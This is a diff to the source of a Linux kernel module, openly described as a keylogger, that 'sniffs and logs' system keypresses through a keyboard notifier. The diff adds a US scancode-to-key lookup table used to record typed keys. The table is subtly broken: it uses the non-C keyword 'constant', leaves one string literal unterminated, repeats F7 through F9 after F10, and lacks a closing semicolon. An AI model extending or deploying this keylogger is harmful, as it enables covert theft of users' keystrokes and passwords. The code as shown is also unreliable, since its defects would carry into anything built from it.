@@ -11,6 +11,32 @@ MODULE_DESCRIPTION("A kernel module to sniff and log the keys pressed in the sys
 int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param);
 
 /* Definitions */
+
+/* Keymap references:
+https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
+http://www.quadibloc.com/comp/scan.htm */
+static constant char* us_keymap[][2] = {
+	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},
+	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},
+	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},
+	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"}, {"_TAB_", "_TAB_"},
+	{"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
+	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},
+	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},
+	{"_ENTER_", "_ENTER_"}, {"_CTRL_", "_CTRL_"}, {"a", "A"}, {"s", "S"},
+	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},
+	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},
+	{"'", "\""}, {"`", "~"}, {"_SHIFT_", "_SHIFT_"}, {"\", "|"},
+	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},
+	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},
+	{".", ">"}, {"/", "?"}, {"_SHIFT_", "_SHIFT_"}, {"_PRTSCR_", "_KPD*_"},
+	{"_ALT_", "_ALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
+	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},
+	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},
+	{"F10", "F10"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},
+	{"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"}, {"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"},
+}
+
 static struct notifier_block keysniffer_blk = {
 	.notifier_call = keysniffer_cb,
 };
